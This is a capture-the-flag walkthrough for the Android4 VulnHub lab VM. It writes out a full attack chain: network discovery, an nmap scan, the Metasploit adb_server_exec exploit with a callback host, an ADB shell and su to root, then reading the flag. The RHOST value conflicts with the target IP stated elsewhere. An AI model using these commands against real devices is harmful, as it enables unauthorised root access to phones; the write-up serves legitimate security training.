<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Android4: Walkthrough (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-android4-walkthrough-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-08-26T13:58:55+00:00">August 26, 2018</time><time class="updated" datetime="2025-06-10T20:29:37+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello everyone and welcome to yet another CTF challenge walkthrough. This time we’ll be putting our hands on Android4 which is made by Touhid Shaikh. You can find the link to download this vulnerable VM here (<a style="color: #000000;" href="https://www.vulnhub.com/entry/android4-1,233/">https://www.vulnhub.com/entry/android4-1,233/</a>).</span></p>
<p><span style="color: #000000;">The level of this vulnerable VM, that I would rate: <strong>beginner.</strong></span></p>
<p><span style="color: #000000;">Steps involved:</span></p>
<ol>
<li><span style="color: #000000;">Port scanning and IP discovery.</span></li>
<li><span style="color: #000000;">Attacking port 8080 proxy using adb_server_exec</span></li>
<li><span style="color: #000000;">Connection to the device using ADB.</span></li>
<li><span style="color: #000000;">Shell grabbing.</span></li>
<li><span style="color: #000000;">Privilege escalation and reading congratulatory flag.</span></li>
</ol>
<p><span style="color: #000000;">Let’s get started then!</span></p>
<p><span style="color: #000000;">First, we’ll grab the IP address using netdiscover utility present in Kali Linux.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-dymXRK6rmLw/W4KwNXHrHuI/AAAAAAAAZ6A/sLaMHrxKhbQBKnQCpyyyPZNTXlIGspr9gCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">In my case, the IP address is 192.168.1.105</span></p>
<p><span style="color: #000000;">The second step is as usual as port scanning. In this scan, we’ll be using an all port aggressive scan using the most popular tool nmap.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.105</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-u81mUpVpgc0/W4KwNuuYbTI/AAAAAAAAZ6E/lBHa7yR7PsApdNyuUHo5FqeLn6rYspyBQCLcBGAs/s1600/2.png"/></strong></span></p>
<p><span style="color: #000000;">From this, we established that there is some kind of web page related to the port 8080.</span></p>
<p><span style="color: #000000;">Without any delay, we opened the webpage but found nothing.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-nxujZ_OawkQ/W4KwOBFqKrI/AAAAAAAAZ6I/d_UmtBpsga0-drtD1LxM5sUp_EPW-9d6QCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Anyone would establish that there is some kind of verbal tampering involved using the POST method. We tried but didn’t find anything useful.</span></p>
<p><span style="color: #000000;">After trying a few other methods (PHP CLI and Dropbear RCE) here is one method that we found the best for our cause.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VK_vnEuonv8/W4KwOXLdohI/AAAAAAAAZ6M/3XtIa8bpckE-tCE7TcgkWIZvEP-i7ZDZgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as installing and debugging apps, and it provides access to a Unix shell that you can use to run a variety of commands on a device. It is a client-server program that includes three components:</span></p>
<ul>
<li><span style="color: #000000;"><strong>A client</strong>, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adb command.</span></li>
<li><span style="color: #000000;"><strong>A daemon (adbd)</strong>, which runs commands on a device. The daemon runs as a background process on each device.</span></li>
<li><span style="color: #000000;"><strong>A server</strong>, which manages communication between the client and the daemon. The server runs as a background process on your development machine.</span></li>
</ul>
<p><span style="color: #000000;">When you start an adb client, the client first checks whether there is an adb server process already running. If there isn’t, it starts the server process</span></p>
<p><span style="color: #000000;">To start an ADB server we used Metasploit:</span></p>
<pre class="lang:default decode:true">use exploit/android/adb/adb_server_exec
set RHOST 192.68.1.105
set LHOST 192.168.1.106
set LPORT 3333
exploit</pre>
<p><span style="color: #000000;">(It is quite possible that the local port won’t accept a connection. In such a case, we change the default port from 4444 to 3333s)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-caRa0Fl5xzY/W4KwOeKnMDI/AAAAAAAAZ6Q/bqczYlEbmUwL6C4UWZPyg2dAJPBNZk9KgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">If you don’t have adb installed you can install it by <strong>sudo apt-get install adb</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Z81TqX5YZFs/W4KwOtS7bEI/AAAAAAAAZ6U/3EtBz737dvc7XGt1GRrQu3qPp2gVpQ0zQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Once the status shows “Connecting to the device, ” on a new terminal window type the command:</span></p>
<pre class="lang:default decode:true">adb connect 192.168.1.105:5555
adb shell</pre>
<p><span style="color: #000000;">In shell:</span></p>
<p><span style="color: #000000;"><strong>ls</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-pd7X1JemM-A/W4KwO-RH1TI/AAAAAAAAZ6Y/E1y7D2I33H0xa9iDsNs4a3fykD4Pb74TACLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">to go to the default directory:</span></p>
<pre class="lang:default decode:true">cd
su</pre>
<p><span style="color: #000000;">Voila! We got a root shell!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-CVpIdyofWCw/W4KwO66dAVI/AAAAAAAAZ6c/Fj8fkA4aYtMpLNN3bv5r2i4EAHmkBdV9wCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;"><strong> </strong>In /data directory we found a folder called “root”</span></p>
<pre class="lang:default decode:true">cd /data
ls</pre>
<p><span style="color: #000000;">The final step was reading the congratulatory flag:</span></p>
<pre class="lang:default decode:true ">cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-qFSQTiZgUXQ/W4KwNdxumXI/AAAAAAAAZ58/eGUOe-ax2qUWXEhIXZJFSG2ZZhlM8jliwCLcBGAs/s1600/10.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
